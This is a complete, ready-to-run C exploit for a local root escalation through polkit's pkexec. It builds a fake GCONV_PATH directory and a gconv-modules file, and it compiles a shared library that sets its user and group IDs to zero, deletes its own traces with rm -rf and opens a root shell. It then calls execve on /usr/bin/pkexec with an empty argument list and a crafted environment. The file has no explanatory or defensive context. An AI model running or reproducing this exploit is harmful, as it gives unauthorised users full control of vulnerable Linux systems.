#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main() {

    system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'");
    system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");

    FILE *fp;
    fp = fopen("pwnkit/pwnkit.c", "w+");
    char text[500] = "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nvoid gconv() {}\n\nvoid gconv_init() {\nsetuid(0); setgid(0);\nseteuid(0); setegid(0);\nsystem(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");\nexit(0);}";
    fputs(text, fp);
    fclose(fp);
    
    system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");

    char *a_argv[]={ NULL };
    char *a_envp[]={
        "pwnkit",
        "PATH=GCONV_PATH=.",
        "CHARSET=PWNKIT",
        "SHELL=pwnkit",
        NULL
    };

    execve("/usr/bin/pkexec", a_argv, a_envp);
}
